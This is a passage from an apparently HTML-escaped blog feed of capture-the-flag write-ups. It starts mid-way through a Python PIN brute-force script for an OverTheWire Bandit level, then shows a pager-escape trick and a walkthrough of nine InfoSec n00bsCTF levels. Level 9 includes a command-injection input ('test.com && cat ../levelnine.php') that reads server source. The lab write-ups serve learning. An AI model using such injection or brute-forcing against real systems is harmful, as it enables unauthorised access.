    &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;shutdown(socket&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;SHUT_WR)&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;recv(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1024&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;break&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;I am the pincode&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;repr(data):&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;continue&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Wrong&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;repr(data):&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;no:&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;content&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;repr(data)&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;content&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Connection closed.&amp;quot;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;close()&lt;/span&gt;

&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sys&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;passw&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;count&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;):&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;trypass&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;%s %04d&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(passw,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;count)&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(netcat(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;30002&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;trypass)):&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;break&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;count&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Some time passes&amp;hellip;..&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;no: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5668
&amp;#39;Correct!\nThe password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\n\nExiting.\n&amp;#39;
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5669
bandit24@melinda:~$ 
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-25-26:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 25 -&amp;gt; 26&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit26.html&#34;&gt;Level 25&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ok, so first we need to see what happens when we log in as Bandit26&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit25@melinda:~$ ssh -i bandit26.sshkey bandit26@localhost
  _                     _ _ _   ___   __  
 | |                   | (_) | |__ \ / /  
 | |__   __ _ _ __   __| |_| |_   ) / /_  
 | &amp;#39;_ \ / _` | &amp;#39;_ \ / _` | | __| / / &amp;#39;_ \ 
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
Connection to localhost closed.
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Hrm&amp;hellip; ok, let&amp;rsquo;s check the shell bandit26 uses:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit25@melinda:/home/bandit25$ cat /etc/passwd &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit25@melinda:/home/bandit25$ cat /usr/bin/showtext
#!/bin/sh

more ~/text.txt
exit 0
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Interesting. So we need to break out of &lt;code&gt;more&lt;/code&gt; somehow. With &lt;code&gt;more&lt;/code&gt; we
can go into interactive mode if we can figure out how to pause it.
We can do that by limiting how much it can output to the screen.
The ASCII art above is about 8 lines, let&amp;rsquo;s resize the terminal to 5 lines
or something, and when it pauses, hit &amp;lsquo;v&amp;rsquo; to open an editor.&lt;/p&gt;

&lt;p&gt;Once in the editor simply open &lt;code&gt;/etc/bandit_pass/bandit26&lt;/code&gt; and the password
is: &lt;code&gt;5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;And that&amp;rsquo;s the last password in the list, and thus the end of the game.&lt;/p&gt;

&lt;p&gt;It was good fun and had a nice incrementing level of difficulty&lt;/p&gt;

&lt;p&gt;Hope you had as much fun as me playing this. Next time we&amp;rsquo;ll tackle &lt;code&gt;Leviathan&lt;/code&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Solving Infosec n00bsCTF</title>
      <link>http://unlogic.co.uk/2015/03/11/infosec-n00bsctf/</link>
      <pubDate>Wed, 11 Mar 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/03/11/infosec-n00bsctf/</guid>
      <description>

&lt;p&gt;The InfoSec Institue is running a &lt;a href=&#34;http://ctf.infosecinstitute.com/index.php&#34;&gt;n00bsCTF&lt;/a&gt;,
and I can&amp;rsquo;t resist a CTF really. Plus this will be a nice warmup for Hackyeaster 2015.
So let&amp;rsquo;s jump on it and get some flags&amp;hellip;&lt;/p&gt;

&lt;p&gt;I haven&amp;rsquo;t managed to get all of them, but I will be updating this post when
I manage to solve some of the others.&lt;/p&gt;

&lt;h2 id=&#34;level-01:aad69195db02279e47989643f4843312&#34;&gt;Level 01&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelone.php&#34;&gt;http://ctf.infosecinstitute.com/levelone.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/ebnLRwp.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;May the source be with you, eh? Sounds to me like someone wants us to look at the
page source. Right click, select &lt;code&gt;view page source&lt;/code&gt; and&amp;hellip;&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;!-- infosec_flagis_welcome --&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;html&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;lang=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And there it is, right at the top.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_welcome
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level-02:aad69195db02279e47989643f4843312&#34;&gt;Level 02&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/leveltwo.php&#34;&gt;http://ctf.infosecinstitute.com/leveltwo.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/TVGZFKU.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;A broken image you say? Let&amp;rsquo;s download it and have a look. We notice it&amp;rsquo;s very small,
only 45 bytes. So let&amp;rsquo;s open it in a hex editor and examine its contents. I opened
it in vim (to use it as a hex editor enter &lt;code&gt;:!xxd&lt;/code&gt;),
and was instantly greeted with this string. Didn&amp;rsquo;t even have to convert it to hex.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;aW5mb3NlY19mbGFnaXNfd2VhcmVqdXN0c3RhcnRpbmc=
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Base64 encoded text. Let&amp;rsquo;s run it through a decoder and see what we get&amp;hellip;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_wearejuststarting
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Level02&amp;rsquo;s flag done.&lt;/p&gt;

&lt;h2 id=&#34;level-03:aad69195db02279e47989643f4843312&#34;&gt;Level 03&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelthree.php&#34;&gt;http://ctf.infosecinstitute.com/levelthree.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/lL8OkTO.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;We are presented with a QR code. So I grabbed my phone, scanned it, and was presented
with a series of dots and dashes. Morse code no doubt. Being lazy I didn&amp;rsquo;t want to type
it into a decoder manually,
so I used &lt;a href=&#34;http://zxing.org/w/decode.jspx&#34;&gt;this tool&lt;/a&gt; to decode the QR code
and then copy/pasted the output into a &lt;a href=&#34;http://www.onlineconversion.com/morse_code.htm&#34;&gt;morse code translator&lt;/a&gt;
and ended up with:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;INFOSECFLAGISMORSING
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level-04:aad69195db02279e47989643f4843312&#34;&gt;Level 04&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelfour.php&#34;&gt;http://ctf.infosecinstitute.com/levelfour.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/yFiSrus.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;A picture and a tidbit of information. Hrmm&amp;hellip; Ok, not much to go with here. Mousing
over the image pops up a dialog. Investigating that didn&amp;rsquo;t lead me anywhere. Time
to get the thinking hats on and think about what info we have here that might be
relevant. Because everything we need to solve this level is somewhere here.
Of course the biggest clue is the picture: Cookie Monster. Right, let&amp;rsquo;s check the cookie
cache. Only one cookie by infosecinstitute. It&amp;rsquo;s garbage! Or is it perhaps just a
caesar cipher? Each letter is shifted by a certain amount, and we need to figure out
that amount. Due to the number of characters and _ in the string, it looks like it.&lt;/p&gt;

&lt;p&gt;Knowing the format of previous flags we can figure out how much to shift by.&lt;/p&gt;

&lt;p&gt;So &lt;code&gt;vasbfrp_syntvf_jrybirpbbxvrf&lt;/code&gt; should be &lt;code&gt;infosec_flag_xxxxxxx&lt;/code&gt;. Knowing this
we can work out the shift. Simple write out the alphabet once and
then, write the letters we know below.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;abcdefghijklmnopqrstuvwxyz
n                 f   i
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That&amp;rsquo;s enough for us to fill in the rest of the alphabet.
Then transpose and solve the final part to get:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flag_welovecookies
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Flag has been nommed.&lt;/p&gt;

&lt;h2 id=&#34;level-05:aad69195db02279e47989643f4843312&#34;&gt;Level 05&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelfive.php&#34;&gt;http://ctf.infosecinstitute.com/levelfive.php&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;A pesky popup saying I&amp;rsquo;m a hacker? What an accusation. Well, let&amp;rsquo;s top it from
popping up and get ourselves a script blocker to see what else there might be.
Once done, we examine the source and see it&amp;rsquo;s loading an image too.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;img&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;src=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;img/aliens.jpg&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;/&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;br&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;/&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;br&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;



&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/JwFtmSw.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Let&amp;rsquo;s load up that image, or even better, let&amp;rsquo;s just browse to &lt;code&gt;http://ctf.infosecinstitute.com/img/&lt;/code&gt;
(Since writing directory listing has been disabled for this path).
Nothing particularily odd about the image. Let&amp;rsquo;s try seeing if there&amp;rsquo;s anything hidden in
it by way of steganography. I loaded up the image into &lt;a href=&#34;http://www.futureboy.us/stegano/decinput.html&#34;&gt;this site&lt;/a&gt;
and sure enough, selecting a type of &lt;code&gt;text/plain&lt;/code&gt; we get a stream of 1s and 0s. Binary data.
Let&amp;rsquo;s try to convert that to a string and see what, if anything, it says. Using any
binary to text decoder on the internet, we are given the flag:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_stegaliens
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Gotcha&lt;/p&gt;

&lt;h2 id=&#34;level-06:aad69195db02279e47989643f4843312&#34;&gt;Level 06&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelsix.php&#34;&gt;http://ctf.infosecinstitute.com/levelsix.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/w81ZV0N.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;At first I was a bit lost, but when you stare at a lot of data, it&amp;rsquo;s easy to be overwhelmed.
Especially when you don&amp;rsquo;t know really what you are looking for. I decided to give it another go
and have located the flag. It&amp;rsquo;s actually in the very first packet. The hex string for &lt;em&gt;infosec_flag&lt;/em&gt;
is starting to look very familiar now. It appears as the data of the first packet:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/aO8ojXG.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Enter the string with &lt;code&gt;696e66...&lt;/code&gt; into a hex to string converter and you get&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_sniffed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Sniffed right out.&lt;/p&gt;

&lt;h2 id=&#34;level-07:aad69195db02279e47989643f4843312&#34;&gt;Level 07&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/404.php&#34;&gt;http://ctf.infosecinstitute.com/404.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/PZu5CIK.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;We get an error saying &lt;em&gt;f00 not found&lt;/em&gt; and the URL reads 404.php. Going by the other URLs
I would assume we actually need &lt;code&gt;levelseven.php&lt;/code&gt;, so let&amp;rsquo;s enter that and see what we get.
It seems to return an empty page. That&amp;rsquo;s not much use, but it&amp;rsquo;s better than a real
404. Because there&amp;rsquo;s no error and no content, we must be getting back a 200 status (all OK).
Perhaps there&amp;rsquo;s something else to look at too?&lt;/p&gt;

&lt;p&gt;In this case let&amp;rsquo;s examine what&amp;rsquo;s going back and forth between us and the server.
You can either fire up a proxy like &lt;a href=&#34;https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project&#34;&gt;ZAP&lt;/a&gt;
or use a request inspection plugin for Firefox like &lt;a href=&#34;https://addons.mozilla.org/en-US/firefox/addon/httprequester/&#34;&gt;httpRequester&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s send off a GET request for &lt;code&gt;levelseven.php&lt;/code&gt; and see what we get back.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;HTTP/1.0 200 aW5mb3NlY19mbGFnaXNfeW91Zm91bmRpdA==
Date: Thu, 12 Mar 2015 09:26:48 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.6
Content-Length: 0
Connection: close
Content-Type: text/html
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Heh, very nice. We have a 200 response with, what is clearly a base64 encoded string.
Copypasta that into a decoder and let&amp;rsquo;s see what we get:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_youfoundit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yes, I did find it.&lt;/p&gt;

&lt;h2 id=&#34;level-08:aad69195db02279e47989643f4843312&#34;&gt;Level 08&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/leveleight.php&#34;&gt;http://ctf.infosecinstitute.com/leveleight.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/OSKPz0g.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Ok, let&amp;rsquo;s download &lt;code&gt;app.exe&lt;/code&gt; and give this a go. It&amp;rsquo;s a wrapper around &lt;code&gt;netstat&lt;/code&gt; that
just shows you what your current connections are. It takes no arguments, so there&amp;rsquo;s
not anyway to attack this thing with overflows. And this being a n00bs level CTF, it&amp;rsquo;s
unlikely we&amp;rsquo;ll be thrown this kind of exploit development.
So the other thing we can do is check its strings.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;strings app.exe
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sure enough, there&amp;rsquo;s &lt;code&gt;infosec_flagis_0x1a&lt;/code&gt;. At first I was reluctant to go with this, as
it&amp;rsquo;s a bit too simple, so I looked a bit further. I dumped the source with &lt;code&gt;objdump&lt;/code&gt;&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;objdump -s app.exe | less
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And I found &lt;code&gt;infosec_flagis_0x1a&lt;/code&gt; in it. It sits at &lt;code&gt;0x403000&lt;/code&gt;, so let&amp;rsquo;s run this
through &lt;code&gt;gdb&lt;/code&gt; too.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$&amp;gt; gdb app.exe
gdb$ disass main
Dump of assembler code for function main:
   0x00401290 &amp;lt;+0&amp;gt;:	push   %ebp
   0x00401291 &amp;lt;+1&amp;gt;:	mov    %esp,%ebp
   0x00401293 &amp;lt;+3&amp;gt;:	sub    $0x18,%esp
   0x00401296 &amp;lt;+6&amp;gt;:	and    $0xfffffff0,%esp
   0x00401299 &amp;lt;+9&amp;gt;:	mov    $0x0,%eax
   0x0040129e &amp;lt;+14&amp;gt;:	add    $0xf,%eax
   0x004012a1 &amp;lt;+17&amp;gt;:	add    $0xf,%eax
   0x004012a4 &amp;lt;+20&amp;gt;:	shr    $0x4,%eax
   0x004012a7 &amp;lt;+23&amp;gt;:	shl    $0x4,%eax
   0x004012aa &amp;lt;+26&amp;gt;:	mov    %eax,-0x8(%ebp)
   0x004012ad &amp;lt;+29&amp;gt;:	mov    -0x8(%ebp),%eax
   0x004012b0 &amp;lt;+32&amp;gt;:	call   0x401740 &amp;lt;_alloca&amp;gt;
   0x004012b5 &amp;lt;+37&amp;gt;:	call   0x4013e0 &amp;lt;__main&amp;gt;
   0x004012ba &amp;lt;+42&amp;gt;:	mov    $0x403000,%eax       &amp;lt;------ aha oho
   0x004012bf &amp;lt;+47&amp;gt;:	mov    %al,-0x1(%ebp)
   0x004012c2 &amp;lt;+50&amp;gt;:	movl   $0x403014,(%esp)
   0x004012c9 &amp;lt;+57&amp;gt;:	call   0x401850 &amp;lt;printf&amp;gt;
   0x004012ce &amp;lt;+62&amp;gt;:	movl   $0x403044,(%esp)
   0x004012d5 &amp;lt;+69&amp;gt;:	call   0x401850 &amp;lt;printf&amp;gt;
   0x004012da &amp;lt;+74&amp;gt;:	movl   $0x403014,(%esp)
   0x004012e1 &amp;lt;+81&amp;gt;:	call   0x401850 &amp;lt;printf&amp;gt;
   0x004012e6 &amp;lt;+86&amp;gt;:	movl   $0x403072,(%esp)
   0x004012ed &amp;lt;+93&amp;gt;:	call   0x401840 &amp;lt;system&amp;gt;
   0x004012f2 &amp;lt;+98&amp;gt;:	call   0x4017c0 &amp;lt;getch&amp;gt;
   0x004012f7 &amp;lt;+103&amp;gt;:	mov    $0x0,%eax
   0x004012fc &amp;lt;+108&amp;gt;:	leave  
   0x004012fd &amp;lt;+109&amp;gt;:	ret
   0x004012fe &amp;lt;+110&amp;gt;:	nop
   0x004012ff &amp;lt;+111&amp;gt;:	nop
End of assembler dump
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There we see a fimilar address. Checking its contents&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;gdb$ x/s 0x403000
0x403000:	 &amp;quot;infosec_flagis_0x1a&amp;quot;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There&amp;rsquo;s nothing that would indicate that this string changes, so for now, I&amp;rsquo;m
going to say the flag is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_0x1a
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Leave a comment below to correct me if I am wrong though, I&amp;rsquo;d really appreciate that.&lt;/p&gt;

&lt;h2 id=&#34;level-09:aad69195db02279e47989643f4843312&#34;&gt;Level 09&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelnine.php&#34;&gt;http://ctf.infosecinstitute.com/levelnine.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/5XnlOL9.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Initially I struggled with this. I tried the usual default passwords without success.
Attacked it with SQL injections, nothing. Then I had a brainwave. Because I already had level15,
I could just look at the &lt;code&gt;levelnine.php&lt;/code&gt; file. So I did. Issue &lt;code&gt;test.com &amp;amp;&amp;amp; cat ../levelnine.php&lt;/code&gt;
and at the end we see what happens if we get the flag:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;alert&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;ssaptluafed_sigalf_cesofni&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #960050; background-color: #1e0010&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It&amp;rsquo;s the flag reversed, so let&amp;rsquo;s flip it to get:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_defaultpass
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ti tog yllaniF&lt;/p&gt;

&lt;p&gt;PS: What&amp;rsquo;s even cuter is if you run &lt;code&gt;test.com &amp;amp;&amp;amp; tac ../levelnine.php&lt;/code&gt;. You actually
get the popup. &lt;code&gt;tac&lt;/code&gt; does the same as &lt;code&gt;cat&lt;/code&gt;, but reverses the lines in the output.
The reason this works is because it will encounter the javascript pop up code before
the conditional that checks the input.&lt;/p&gt;

&lt;p&gt;It also prints out the username and password for us:
&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;?&amp;gt; } echo &amp;quot;&amp;quot;; if ($username == &amp;#39;root&amp;#39; and $password == &amp;#39;attack&amp;#39;) { 
    $password = $_POST[&amp;#39;password&amp;#39;]; 
    $username = $_POST[&amp;#39;username&amp;#39;];
&lt;/pre&gt;&lt;/div&gt;
